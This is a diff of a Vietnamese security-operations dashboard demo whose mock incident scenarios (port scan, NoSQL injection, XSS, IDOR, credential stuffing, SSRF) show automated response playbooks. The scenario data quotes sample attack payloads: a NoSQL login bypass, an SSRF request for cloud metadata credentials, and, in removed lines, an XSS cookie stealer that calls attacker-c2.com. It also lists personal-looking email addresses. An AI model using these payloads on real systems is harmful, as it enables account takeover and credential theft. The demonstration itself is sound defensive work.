-          source_ip: "45.146.164.110",
-          ports_scanned: [21, 22, 23, 80, 443, 1433, 3306, 27017],
-          packets_per_sec: 850,
-          tool: "Masscan / Nmap"
+          _id: "66f9104b2a81230018a12005",
+          alert_id: "11a98231-6655-4b11-9988-123456789abc",
+          type: "Port Scan Detection",
+          severity: "Medium",
+          source_ip: "103.11.22.33",
+          destination_ip: "10.0.0.15",
+          victim_email: "dae1924mike@gmail.com",
+          payload: {
+            title: "Cảnh báo Rà quét cổng mạng nội bộ",
+            scanned_ports: [21, 22, 80, 443, 3306, 8080],
+            total_packets: 1500,
+            tool_used: "Nmap Port Scanner",
+            source_ip: "103.11.22.33",
+            description: "IP độc hại rà quét cổng (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:20:10", title: "1. IDS kích hoạt cảnh báo rà quét cổng", desc: "Phát hiện lưu lượng SYN bất thường từ 45.146.164.110." },
-          { time: "11:20:12", title: "2. n8n tự động thêm vào Blacklist", desc: "Đẩy IP vào danh sách đen của bộ định tuyến biên." },
-          { time: "11:20:13", title: "3. Đóng cảnh báo & Gắn tag #soar-done", desc: "Hạ tầng an toàn, sự cố được xử lý tự động hoàn toàn." }
+          { time: "11:20:10", title: "1. Webhook nhận cảnh báo rà quét cổng", desc: "IDS ghi nhận 1500 gói tin Nmap quét cổng 21, 22, 80, 443, 3306, 8080." },
+          { time: "11:20:12", title: "2. n8n tra cứu chỉ số AbuseIPDB", desc: "IP 103.11.22.33 có chỉ số nguy cơ Abuse Score 90/100." },
+          { time: "11:20:14", title: "3. Tự động thêm vào danh sách chặn IP", desc: "Cập nhật IPTables chặn gói tin từ 103.11.22.33." },
+          { time: "11:20:15", title: "4. Gửi email cảnh báo & Gắn tag #soar-done", desc: "Thông báo hoàn tất điều phối đến dae1924mike@gmail.com." }
         ]
       },
 
-      // 5. NoSQL Injection
+      // 5. NoSQL Injection Detection (Có AbuseIPDB)
       {
+        playbook: "Playbook #6",
         title: "NoSQL Injection Detection",
+        subTitle: "Cảnh báo Tấn công tiêm nhiễm CSDL (NoSQL Injection)",
         severity: "CRITICAL",
-        severityColor: "red",
-        mitreCode: "MITRE T1190",
         icon: "database",
         incidentId: "897ba289-42b1-4876-9ec1-197e6e5a401c",
         time: "11:24:05 - 29/09/2026",
-        source: "217.245.12.30",
-        target: "10.0.0.15 (Auth API Service)",
-        geo: "Moscow, Russia (Tor Node)",
-        score: "96% Malicious (AbuseIPDB)",
-        tiEngine: "VirusTotal & AbuseIPDB Engine",
-        tiVerdict: "EXPLOIT SCANNER",
-        tiRatio: "18 / 72",
-        tiDesc: "Antivirus engines gắn cờ độc hại và IP có 96% báo cáo tấn công",
-        tiCategory: "Web Application Exploit / Injection",
-        tiTarget: "217.245.12.30",
+        source: "103.11.22.33 (Attacker)",
+        target: "10.0.0.15 (/api/v1/auth/login)",
+        victimEmail: "dat.tanvo6767@gmail.com",
+        geo: "Moscow, Russia (Bulletproof Hosting)",
+        score: "AbuseIPDB Threat Score: 95/100",
+        tiEngine: "WAF Rule & AbuseIPDB Engine",
+        tiIcon: "shield-alert",
+        tiVerdict: "MALICIOUS INJECTION",
+        tiRatio: "95 / 100",
+        tiPercent: "95%",
+        tiDesc: "Payload chứa cú pháp NoSQLi từ IP độc (True Positive)",
+        tiCategory: "Database Exploit / NoSQL Injection",
+        tiTarget: "103.11.22.33",
         geoAsn: "AS49505 (Hostkey B.V.)",
         geoConn: "Tor Exit Relay / Bulletproof Hosting",
-        geoAsset: "Cụm Production Kubernetes (Namespace: prod-api)",
-        mitreTactic: "Initial Access (Truy cập ban đầu)",
-        mitreTech: "T1190 - Exploit Public-Facing App",
-        mitreDet: "WAF Signature: Mongo $gt / $ne Rule",
-        forensicTitle: "Đoạn Mã Độc Hại Trích Xuất (Attack Payload)",
-        forensicDesc: "Kẻ tấn công sử dụng toán tử Mongo nhằm vượt qua cơ chế xác thực mật khẩu.",
-        forensicBox: `POST /api/v1/auth/login HTTP/1.1<br>Host: api.company.com<br>Body: {"username": "admin", "password": {"$ne": null}}<br>Result: 200 OK (Bypassed if unpatched)`,
+        geoAsset: "Cụm Node.js Auth Backend (10.0.0.15)",
+        forensicTitle: "Bằng Chứng Đoạn Mã Độc Hại Trích Xuất (mockGenerator)",
+        forensicDesc: "Kẻ tấn công sử dụng toán tử Mongo {$ne: null, $gt: ''} vượt qua xác thực API đăng nhập.",
+        forensicBox: `Endpoint: /api/v1/auth/login<br>Injected Payload: {"username": {"$ne": null}, "password": {"$gt": ""}}<br>Source IP: 103.11.22.33<br>Description: Payload chứa cú pháp NoSQLi từ IP độc (True Positive).`,
         rawJson: {
-          event: "NoSQL_Injection",
-          source_ip: "217.245.12.30",
+          _id: "66f9104b2a81230018a12006",
+          alert_id: "897ba289-42b1-4876-9ec1-197e6e5a401c",
+          type: "NoSQL Injection Detection",
+          severity: "Critical",
+          source_ip: "103.11.22.33",
           destination_ip: "10.0.0.15",
-          injected_operator: "$ne",
-          matched_rule: "RULE-APP-NOSQL-004",
-          action: "Blocked by WAF"
+          victim_email: "dat.tanvo6767@gmail.com",
+          payload: {
+            title: "Cảnh báo Tấn công tiêm nhiễm CSDL (NoSQL Injection)",
+            endpoint: "/api/v1/auth/login",
+            injected_payload: {
+              username: { "$ne": null },
+              password: { "$gt": "" }
+            },
+            source_ip: "103.11.22.33",
+            description: "Payload chứa cú pháp NoSQLi từ IP độc (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:24:05", title: "1. Webhook tiếp nhận sự cố từ WAF", desc: "WAF bắt quả tang truy vấn chèn toán tử $ne vào form đăng nhập." },
-          { time: "11:24:08", title: "2. Gọi API VirusTotal & AbuseIPDB", desc: "Xác nhận IP 217.245.12.30 có độ nguy hiểm 96%." },
-          { time: "11:24:10", title: "3. Tự động đẩy Rule chặn IP vĩnh viễn", desc: "Khóa IP trên WAF Cloudflare và Tường lửa Linux." },
-          { time: "11:24:12", title: "4. Hoàn tất & Gắn tag #soar-done", desc: "Đồng bộ kết quả về bảng SOC Dashboard." }
+          { time: "11:24:05", title: "1. Webhook nhận sự cố NoSQLi từ WAF", desc: "Bắt quả tang request POST /api/v1/auth/login chứa toán tử $ne/$gt." },
+          { time: "11:24:08", title: "2. n8n tra cứu chỉ số AbuseIPDB của IP", desc: "IP 103.11.22.33 đạt điểm đe dọa 95% độc hại." },
+          { time: "11:24:10", title: "3. Tự động đẩy Rule chặn IP vĩnh viễn", desc: "Khóa IP trên WAF NGINX và iptables tường lửa." },
+          { time: "11:24:12", title: "4. Gửi email khẩn & Đóng sự cố", desc: "Gửi báo cáo phân tích tới dat.tanvo6767@gmail.com." }
         ]
       },
 
       // 6. Cross-Site Scripting (XSS)
       {
-        title: "Cross-Site Scripting (Stored XSS)",
-        severity: "HIGH",
-        severityColor: "orange",
-        mitreCode: "MITRE T1189",
+        playbook: "Playbook #7",
+        title: "Cross-Site Scripting (XSS)",
+        subTitle: "Cảnh báo Chèn mã độc giao diện (XSS)",
+        severity: "MEDIUM",
         icon: "code",
         incidentId: "ba73877c-348b-4f27-86d8-15a0f51f42d3",
         time: "11:28:40 - 29/09/2026",
         source: "91.240.118.82",
-        target: "10.0.0.20 (Customer Support Forum)",
+        target: "10.0.0.15 (/api/v1/comments)",
+        victimEmail: "isseidat159@gmail.com",
         geo: "Warsaw, Poland",
-        score: "WAF XSS Signature Triggered",
-        tiEngine: "WAF XSS Heuristics",
-        tiVerdict: "STORED XSS PAYLOAD",
-        tiRatio: "Severity: High",
-        tiDesc: "Phát hiện chèn thẻ script độc hại nhằm đánh cắp Session Cookie",
-        tiCategory: "Client-Side Code Injection",
-        tiTarget: "91.240.118.82",
+        score: "DOMPurify / WAF XSS Pattern Triggered",
+        tiEngine: "WAF Pattern & Sanitizer Inspector",
+        tiIcon: "shield-alert",
+        tiVerdict: "XSS SCRIPT INJECTION",
+        tiRatio: "&lt;script&gt;",
+        tiPercent: "90%",
+        tiDesc: "Payload chứa Script thực thi (True Positive)",
+        tiCategory: "Client-Side Code Injection (XSS)",
+        tiTarget: "/api/v1/comments",
         geoAsn: "AS47583 (Host Europe GmbH)",
         geoConn: "Commercial Cloud Provider",
-        geoAsset: "Web Frontend Portal (React & Nginx)",
-        mitreTactic: "Initial Access (Truy cập ban đầu)",
-        mitreTech: "T1189 - Drive-by Compromise",
-        mitreDet: "WAF Rule: Script Tag with Cookie Stealer",
-        forensicTitle: "Bằng Chứng Mã Độc JavaScript Đính Kèm",
-        forensicDesc: "Kẻ tấn công gửi mã độc vào ô bình luận nhằm chiếm phiên của quản trị viên khi xem xét duyệt.",
-        forensicBox: `Field: comment_content<br>Injected: &lt;script&gt;fetch('https://attacker-c2.com/steal?cookie='+document.cookie)&lt;/script&gt;<br>Target Cookie: session_token (HttpOnly Protection Missing)`,
+        geoAsset: "Web Frontend Portal (React & Nginx - 10.0.0.15)",
+        forensicTitle: "Bằng Chứng Chèn Thẻ Script Độc Hại (mockGenerator)",
+        forensicDesc: "Kẻ tấn công gửi mã &lt;script&gt;alert(1)&lt;/script&gt; vào endpoint /api/v1/comments.",
+        forensicBox: `Endpoint: /api/v1/comments<br>Injected Payload: &lt;script&gt;alert(1)&lt;/script&gt;<br>Description: Payload chứa Script thực thi (True Positive).`,
         rawJson: {
-          event: "Cross_Site_Scripting",
-          attack_type: "Stored_XSS",
+          _id: "66f9104b2a81230018a12007",
+          alert_id: "ba73877c-348b-4f27-86d8-15a0f51f42d3",
+          type: "Cross-Site Scripting (XSS)",
+          severity: "Medium",
           source_ip: "91.240.118.82",
-          endpoint: "/api/v1/comments",
-          injected_payload: "&lt;script&gt;fetch('https://attacker-c2.com/steal?cookie='+document.cookie)&lt;/script&gt;"
+          destination_ip: "10.0.0.15",
+          victim_email: "isseidat159@gmail.com",
+          payload: {
+            title: "Cảnh báo Chèn mã độc giao diện (XSS)",
+            endpoint: "/api/v1/comments",
+            injected_payload: "<script>alert(1)<" + "/script>",
+            description: "Payload chứa Script thực thi (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:28:40", title: "1. WAF phát hiện chuỗi &lt;script&gt; trong body", desc: "Hệ thống lập tức ngăn việc lưu vào Database." },
-          { time: "11:28:42", title: "2. n8n tự động lọc (Sanitize) nội dung", desc: "Dọn dẹp các ký tự nguy hiểm bằng DOMPurify." },
-          { time: "11:28:44", title: "3. Tạm khóa quyền gửi bài của User nghi vấn", desc: "Tài khoản gửi mã độc bị chuyển về trạng thái Read-Only." }
+          { time: "11:28:40", title: "1. Webhook nhận sự cố XSS từ WAF", desc: "Phát hiện chuỗi &lt;script&gt;alert(1)&lt;/script&gt; gửi tới /api/v1/comments." },
+          { time: "11:28:42", title: "2. n8n kiểm tra nội dung payload", desc: "Xác thực payload chứa thẻ script thực thi mã nguy hiểm." },
+          { time: "11:28:44", title: "3. Tự động áp dụng bộ lọc (Sanitize)", desc: "Khử độc chuỗi ký tự bằng DOMPurify và ngăn ghi vào database." },
+          { time: "11:28:45", title: "4. Gửi email cảnh báo & Đóng sự cố", desc: "Thông báo hoàn tất xử lý tới isseidat159@gmail.com." }
         ]
       },
 
       // 7. Insecure Direct Object Reference (IDOR)
       {
+        playbook: "Playbook #8",
         title: "Insecure Direct Object Reference (IDOR)",
-        severity: "MEDIUM",
-        severityColor: "amber",
-        mitreCode: "MITRE T1552.001",
+        subTitle: "Cảnh báo Truy cập trái phép tài nguyên (IDOR)",
+        severity: "HIGH",
         icon: "unlock",
         incidentId: "1474f265-7811-4c12-8812-9988123412ab",
         time: "11:32:15 - 29/09/2026",
         source: "38.147.246.77 (Client VPN)",
-        target: "10.0.0.15 (/api/v1/orders/{id})",
+        target: "10.0.0.15 (/api/v1/orders/9999)",
+        victimEmail: "wibuuwu159@gmail.com",
         geo: "California, United States",
-        score: "Sequential Enumeration Anomaly",
-        tiEngine: "API Behavioral Analytics",
-        tiVerdict: "DATA ENUMERATION",
-        tiRatio: "125 Requests / Min",
-        tiDesc: "Tài khoản thường cố tình duyệt xem đơn hàng của các khách hàng khác",
+        score: "Quyền hạn 'Viewer' truy cập đơn hàng #9999",
+        tiEngine: "RBAC Authorization Engine",
+        tiIcon: "user-x",
+        tiVerdict: "UNAUTHORIZED PRIVILEGE",
+        tiRatio: "Role: Viewer",
+        tiPercent: "95%",
+        tiDesc: "Người dùng quyền thấp đổi ID truy cập trái phép (True Positive)",
         tiCategory: "Broken Object Level Authorization (BOLA)",
-        tiTarget: "User ID: u_98124 (Authenticated)",
+        tiTarget: "/api/v1/orders/9999",
         geoAsn: "AS174 (Cogent Communications)",
         geoConn: "Residential Broadband",
-        geoAsset: "Billing & Order Database Microservice",
-        mitreTactic: "Credential Access (Thu thập dữ liệu trái phép)",
-        mitreTech: "T1552 - Unsecured Credentials",
-        mitreDet: "RBAC Anomaly: Accessing Non-owned Record IDs",
-        forensicTitle: "Bằng Chứng Duyệt Số Thứ Tự Đơn Hàng Trái Phép",
-        forensicDesc: "Người dùng đăng nhập bằng tài khoản u_98124 nhưng liên tục tăng ID đơn hàng để xem trộm thông tin.",
-        forensicBox: `GET /api/v1/orders/1001 (Belongs to User 402) - HTTP 403 Forbidden<br>GET /api/v1/orders/1002 (Belongs to User 403) - HTTP 403 Forbidden<br>GET /api/v1/orders/1003 (Belongs to User 404) - HTTP 403 Forbidden<br>Alert Trigger: Rate of Unauthorized Access > 5 in 1 minute`,
+        geoAsset: "Billing & Order Database Service (10.0.0.15)",
+        forensicTitle: "Bằng Chứng Vi Phạm Phân Quyền IDOR (mockGenerator)",
+        forensicDesc: "Tài khoản có vai trò 'Viewer' cố tình thay đổi tham số URL truy cập đơn hàng /api/v1/orders/9999.",
+        forensicBox: `Endpoint: /api/v1/orders/9999<br>User Role: Viewer<br>Description: Người dùng quyền thấp đổi ID truy cập trái phép (True Positive).<br>Status: Blocked by API Gateway`,
         rawJson: {
-          event: "IDOR_Violation",
-          authenticated_user: "u_98124",
+          _id: "66f9104b2a81230018a12008",
+          alert_id: "1474f265-7811-4c12-8812-9988123412ab",
+          type: "Insecure Direct Object Reference (IDOR)",
+          severity: "High",
           source_ip: "38.147.246.77",
-          requested_resources: ["order_1001", "order_1002", "order_1003"],
-          status: "Blocked by RBAC Gateway"
+          destination_ip: "10.0.0.15",
+          victim_email: "wibuuwu159@gmail.com",
+          payload: {
+            title: "Cảnh báo Truy cập trái phép tài nguyên (IDOR)",
+            endpoint: "/api/v1/orders/9999",
+            user_role: "Viewer",
+            description: "Người dùng quyền thấp đổi ID truy cập trái phép (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:32:15", title: "1. Gateway phát hiện nỗ lực duyệt trộm ID", desc: "Hệ thống RBAC chặn toàn bộ phản hồi dữ liệu." },
-          { time: "11:32:17", title: "2. Tự động thu hồi JWT Token của tài khoản", desc: "Đăng xuất tài khoản u_98124 khỏi toàn bộ ứng dụng." },
-          { time: "11:32:19", title: "3. Đánh dấu cờ tài khoản nghi vấn (Flagged)", desc: "Gửi báo cáo vi phạm chính sách cho bộ phận Kiểm soát nội bộ." }
+          { time: "11:32:15", title: "1. API Gateway phát hiện vi phạm IDOR", desc: "User vai trò Viewer gửi yêu cầu GET /api/v1/orders/9999." },
+          { time: "11:32:17", title: "2. n8n kiểm tra điều kiện user_role", desc: "Xác thực vai trò là 'Viewer', không có thẩm quyền truy cập đơn hàng #9999." },
+          { time: "11:32:19", title: "3. Tự động thu hồi JWT Token của phiên", desc: "Khóa phiên làm việc của user vi phạm." },
+          { time: "11:32:20", title: "4. Gửi email cảnh báo vi phạm & Đóng sự cố", desc: "Gửi báo cáo bảo mật tới wibuuwu159@gmail.com." }
         ]
       },
 
       // 8. Credential Stuffing
       {
-        title: "Credential Stuffing Detection",
+        playbook: "Playbook #9",
+        title: "Credential Stuffing",
+        subTitle: "Cảnh báo Nhồi nhét Thông tin Xác thực",
         severity: "HIGH",
-        severityColor: "orange",
-        mitreCode: "MITRE T1110.004",
         icon: "users",
         incidentId: "c267dee2-1245-4890-a123-556677889900",
         time: "11:35:20 - 29/09/2026",
         source: "178.62.204.88 (Bot Proxy)",
         target: "10.0.0.15 (/api/v1/auth/login)",
+        victimEmail: "alvaroll18cau@gmail.com",
         geo: "London, United Kingdom",
-        score: "HaveIBeenPwned Match: 100%",
-        tiEngine: "Breach Database Threat Intel",
-        tiVerdict: "LEAKED COMBO ATTACK",
-        tiRatio: "500 Accounts Tried",
-        tiDesc: "Sử dụng danh sách tài khoản/mật khẩu bị rò rỉ từ các vụ hack công cộng",
-        tiCategory: "Automated Credential Spraying",
-        tiTarget: "178.62.204.88",
+        score: "50 Lần Đăng Nhập Thất Bại Liên Tiếp",
+        tiEngine: "Rate-Limiter & Account Anomaly Guard",
+        tiIcon: "shield-alert",
+        tiVerdict: "BOT SPRAY ATTACK",
+        tiRatio: "50 Fails / 2 Success",
+        tiPercent: "96%",
+        tiDesc: "Đăng nhập sai 50 lần liên tiếp (True Positive)",
+        tiCategory: "Automated Credential Stuffing",
+        tiTarget: "/api/v1/auth/login",
         geoAsn: "AS14061 (DigitalOcean LLC)",
         geoConn: "Cloud VPS / Proxy Farm",
-        geoAsset: "Identity Provider (Keycloak / Auth0)",
-        mitreTactic: "Credential Access",
-        mitreTech: "T1110.004 - Credential Stuffing",
-        mitreDet: "High Failure Diversity (500 distinct usernames / 5 min)",
-        forensicTitle: "Bằng Chứng Tấn Công Nhồi Nhét Danh Sách Lộ Lọt",
-        forensicDesc: "Bot sử dụng combo list 'Collection#1' để thử đăng nhập tự động vào hàng trăm tài khoản khách hàng.",
-        forensicBox: `POST /api/v1/auth/login - user1@gmail.com : pass123 (Failed)<br>POST /api/v1/auth/login - user2@yahoo.com : 12345678 (Failed)<br>POST /api/v1/auth/login - user3@company.com : P@ssword2024 (Success - Compromised)<br>Action: Intercepted before session issue`,
+        geoAsset: "Identity Provider (Auth Service - 10.0.0.15)",
+        forensicTitle: "Bằng Chứng Nhồi Mật Khẩu Tự Động (mockGenerator)",
+        forensicDesc: "Phát hiện 50 lần đăng nhập thất bại và 2 lần thành công từ địa chỉ IP 178.62.204.88.",
+        forensicBox: `Endpoint: /api/v1/auth/login<br>Failed Logins: 50<br>Successful Logins: 2<br>Description: Đăng nhập sai 50 lần liên tiếp (True Positive).`,
         rawJson: {
-          event: "Credential_Stuffing",
-          total_attempts: 500,
-          unique_usernames: 500,
+          _id: "66f9104b2a81230018a12009",
+          alert_id: "c267dee2-1245-4890-a123-556677889900",
+          type: "Credential Stuffing",
+          severity: "High",
           source_ip: "178.62.204.88",
-          time_taken: "300s",
-          compromised_accounts: ["user3@company.com"]
+          destination_ip: "10.0.0.15",
+          victim_email: "alvaroll18cau@gmail.com",
+          payload: {
+            title: "Cảnh báo Nhồi nhét Thông tin Xác thực",
+            endpoint: "/api/v1/auth/login",
+            failed_logins: 50,
+            successful_logins: 2,
+            description: "Đăng nhập sai 50 lần liên tiếp (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:35:20", title: "1. Bật cơ chế phòng thủ tự động WAF", desc: "Kích hoạt thử thách Captcha bắt buộc cho dải IP DigitalOcean." },
-          { time: "11:35:22", title: "2. n8n tự động khóa tài khoản bị lộ mật khẩu", desc: "Tài khoản user3@company.com được đặt cờ 'Force Password Reset'." },
-          { time: "11:35:24", title: "3. Gửi thông báo khẩn qua Email cho khách hàng", desc: "Yêu cầu người dùng đổi ngay mật khẩu vì đã bị rò rỉ ở bên thứ 3." }
+          { time: "11:35:20", title: "1. Webhook nhận cảnh báo nhồi thông tin xác thực", desc: "Ghi nhận 50 lần thử sai từ IP 178.62.204.88." },
+          { time: "11:35:22", title: "2. n8n kiểm tra điều kiện failed_logins > 20", desc: "Xác nhận số lần sai (50) vượt ngưỡng nguy hiểm." },
+          { time: "11:35:24", title: "3. Tự động kích hoạt Captcha & Block IP", desc: "Bắt buộc giải Captcha và tạm chặn IP vi phạm." },
+          { time: "11:35:25", title: "4. Gửi email thông báo quản trị viên & Đóng sự cố", desc: "Gửi báo cáo tới alvaroll18cau@gmail.com." }
         ]
       },
 
       // 9. Server-Side Request Forgery (SSRF)
       {
+        playbook: "Playbook #10",
         title: "Server-Side Request Forgery (SSRF)",
+        subTitle: "Cảnh báo Lỗ hổng giả mạo yêu cầu máy chủ (SSRF)",
         severity: "CRITICAL",
-        severityColor: "red",
-        mitreCode: "MITRE T1190.001",
         icon: "server",
         incidentId: "01cfe77e-9081-4321-ba88-771122334455",
         time: "11:38:50 - 29/09/2026",
         source: "198.51.100.42",
-        target: "10.0.0.12 (Image Processing Service)",
+        target: "10.0.0.15 (169.254.169.254)",
+        victimEmail: "dae1924mike@gmail.com",
         geo: "Toronto, Canada",
-        score: "Cloud Metadata Access Detected",
-        tiEngine: "Cloud Security Posture (CSPM)",
+        score: "Cloud Metadata IP: 169.254.169.254",
+        tiEngine: "Cloud Egress & Metadata Guard",
+        tiIcon: "shield-alert",
         tiVerdict: "METADATA EXFILTRATION",
-        tiRatio: "Severity: Critical",
-        tiDesc: "Thao túng máy chủ gọi tới dải IP 169.254.169.254 để trộm AWS IAM Token",
+        tiRatio: "169.254.169.254",
+        tiPercent: "100%",
+        tiDesc: "Gọi đến AWS Metadata (True Positive)",
         tiCategory: "Cloud Privilege Escalation / SSRF",
-        tiTarget: "http://169.254.169.254",
+        tiTarget: "http://169.254.169.254/latest/meta-data/",
         geoAsn: "AS13335 (Cloudflare WARP)",
         geoConn: "External VPN",
-        geoAsset: "Backend Image Resizer (NodeJS Microservice)",
-        mitreTactic: "Initial Access & Privilege Escalation",
-        mitreTech: "T1190 - Exploit Public-Facing App",
-        mitreDet: "Outbound Egress Rule: Block 169.254.0.0/16",
-        forensicTitle: "Bằng Chứng Khai Thác Lỗ Hổng SSRF Đánh Cắp Khóa AWS",
-        forensicDesc: "Hacker gửi request yêu cầu tính năng tải ảnh từ URL gọi vào API metadata nội bộ của máy chủ đám mây.",
-        forensicBox: `POST /api/v1/profile/avatar-url HTTP/1.1<br>Host: app.company.com<br>Body: {"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"}<br>Attacker Intent: Steal AWS Temporary STS Keys to compromise entire cloud.`,
+        geoAsset: "Backend Image Fetcher Microservice (10.0.0.15)",
+        forensicTitle: "Bằng Chứng Khai Thác SSRF Đánh Cắp Metadata (mockGenerator)",
+        forensicDesc: "Yêu cầu tính năng tải ảnh từ xa gọi vào dải IP Metadata nhạy cảm 169.254.169.254.",
+        forensicBox: `Endpoint: /api/v1/fetch-image?url=http://169.254.169.254/latest/meta-data/<br>Target Internal IP: 169.254.169.254<br>Description: Gọi đến AWS Metadata (True Positive).`,
         rawJson: {
-          event: "SSRF_Exploit",
-          request_uri: "/api/v1/profile/avatar-url",
-          injected_url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          _id: "66f9104b2a81230018a12010",
+          alert_id: "01cfe77e-9081-4321-ba88-771122334455",
+          type: "Server-Side Request Forgery (SSRF)",
+          severity: "Critical",
           source_ip: "198.51.100.42",
-          internal_target: "169.254.169.254",
-          status: "Intercepted by Outbound Firewall"
+          destination_ip: "10.0.0.15",
+          victim_email: "dae1924mike@gmail.com",
+          payload: {
+            title: "Cảnh báo Lỗ hổng giả mạo yêu cầu máy chủ (SSRF)",
+            endpoint: "/api/v1/fetch-image?url=http://169.254.169.254/latest/meta-data/",
+            target_internal_ip: "169.254.169.254",
+            description: "Gọi đến AWS Metadata (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:38:50", title: "1. Tường lửa Egress chặn kết nối ra dải Metadata", desc: "Không cho phép Image Service kết nối tới 169.254.169.254." },
-          { time: "11:38:52", title: "2. n8n tự động cô lập máy chủ bị tấn công", desc: "Chuyển container Image Service sang trạng thái cách ly an toàn." },
-          { time: "11:38:54", title: "3. Tự động xoay vòng khóa AWS IAM (Credential Rotation)", desc: "Thu hồi toàn bộ phiên tạm thời để phòng ngừa rủi ro rò rỉ." }
+          { time: "11:38:50", title: "1. Webhook nhận cảnh báo SSRF", desc: "Máy chủ nhận yêu cầu gọi tới dải Metadata 169.254.169.254." },
+          { time: "11:38:52", title: "2. n8n kiểm tra target_internal_ip", desc: "Xác thực target_internal_ip == 169.254.169.254." },
+          { time: "11:38:54", title: "3. Tự động cô lập máy chủ bị tấn công", desc: "Chuyển container Image Service sang trạng thái cách ly an toàn." },
+          { time: "11:38:55", title: "4. Gửi email cảnh báo & Đóng sự cố", desc: "Gửi báo cáo điều phối tới dae1924mike@gmail.com." }
         ]
       }
     ];
 
-    // Khởi tạo icon
-    lucide.createIcons();
+    // Helper hàm render icon an toàn, không bị xung đột DOM
+    function renderIcon(containerId, iconName, className) {
+      const container = document.getElementById(containerId);
+      if (container) {
+        container.innerHTML = `<i data-lucide="${iconName}" class="${className}"></i>`;
+      }
+    }
+
+    // Toast notification
+    function showToast(message, isSuccess = true) {
+      const toast = document.getElementById('toastNotification');
+      const toastMsg = document.getElementById('toastMessage');
+      if (!toast) return;
+      toastMsg.innerText = message;
+      renderIcon('toastIcon', isSuccess ? 'check-circle' : 'alert-circle', isSuccess ? 'w-4 h-4 text-emerald-400' : 'w-4 h-4 text-rose-400');
+      lucide.createIcons();
+      toast.classList.remove('translate-y-20', 'opacity-0');
+      toast.classList.add('translate-y-0', 'opacity-100');
+      setTimeout(() => {
+        toast.classList.remove('translate-y-0', 'opacity-100');
+        toast.classList.add('translate-y-20', 'opacity-0');
+      }, 3000);
+    }
 
     // Hàm chuyển kịch bản
     function loadScenario(index) {
       const data = SCENARIOS[index];
+      if (!data) return;
+
+      // Đồng bộ giá trị Dropdown
+      const selectEl = document.getElementById('scenarioSelect');
+      if (selectEl) selectEl.value = index;
       
       // Update Headers
       document.getElementById('scenarioTitle').innerText = data.title;
+      const subTitleEl = document.getElementById('scenarioSubTitle');
+      if (subTitleEl) subTitleEl.innerText = data.subTitle || data.title;
       document.getElementById('incidentId').innerText = data.incidentId;
-      document.getElementById('mitreBadge').innerText = data.mitreCode;
+      document.getElementById('incidentTime').innerText = data.time;
+      document.getElementById('playbookBadge').innerText = data.playbook;
       
-      // Severity Badge
+      // Header Icon Box & Severity
       const sevBadge = document.getElementById('severityBadge');
       sevBadge.innerText = data.severity;
+      const typeIconBox = document.getElementById('typeIconBox');
+      
       if (data.severity === 'CRITICAL') {
         sevBadge.className = "px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20";
-        document.getElementById('typeIconBox').className = "w-10 h-10 rounded-xl bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20 flex items-center justify-center font-bold";
+        typeIconBox.className = "w-10 h-10 rounded-xl bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20 flex items-center justify-center font-bold shrink-0";
       } else if (data.severity === 'HIGH') {
         sevBadge.className = "px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-orange-500/10 text-orange-600 dark:text-orange-400 border border-orange-500/20";
-        document.getElementById('typeIconBox').className = "w-10 h-10 rounded-xl bg-orange-500/10 text-orange-600 dark:text-orange-400 border border-orange-500/20 flex items-center justify-center font-bold";
+        typeIconBox.className = "w-10 h-10 rounded-xl bg-orange-500/10 text-orange-600 dark:text-orange-400 border border-orange-500/20 flex items-center justify-center font-bold shrink-0";
       } else if (data.severity === 'MEDIUM') {
         sevBadge.className = "px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20";
-        document.getElementById('typeIconBox').className = "w-10 h-10 rounded-xl bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20 flex items-center justify-center font-bold";
+        typeIconBox.className = "w-10 h-10 rounded-xl bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20 flex items-center justify-center font-bold shrink-0";
       } else {
         sevBadge.className = "px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-500/20";
-        document.getElementById('typeIconBox').className = "w-10 h-10 rounded-xl bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-500/20 flex items-center justify-center font-bold";
+        typeIconBox.className = "w-10 h-10 rounded-xl bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-500/20 flex items-center justify-center font-bold shrink-0";
       }
+      renderIcon('typeIconBox', data.icon, 'w-5 h-5');
 
       // Quick Stats Strip
       document.getElementById('statSource').innerText = data.source;
@@ -798,17 +977,16 @@
 
       // Tab 1: Threat Intel
       document.getElementById('tiEngineName').innerText = data.tiEngine;
+      renderIcon('tiIconBox', data.tiIcon || 'shield', 'w-4 h-4 text-cyan-600 dark:text-cyan-400');
       document.getElementById('tiVerdictBadge').innerText = data.tiVerdict;
       document.getElementById('tiRatio').innerText = data.tiRatio;
+      document.getElementById('tiPercentCircle').innerText = data.tiPercent || '100%';
       document.getElementById('tiRatioDesc').innerText = data.tiDesc;
       document.getElementById('tiCategory').innerText = data.tiCategory;
       document.getElementById('tiTargetQueried').innerText = data.tiTarget;
       document.getElementById('geoAsn').innerText = data.geoAsn;
       document.getElementById('geoConnectionType').innerText = data.geoConn;
       document.getElementById('geoInternalAsset').innerText = data.geoAsset;
-      document.getElementById('mitreTactic').innerText = data.mitreTactic;
-      document.getElementById('mitreTechnique').innerText = data.mitreTech;
-      document.getElementById('mitreDetection').innerText = data.mitreDet;
 
       // Tab 2: Forensics
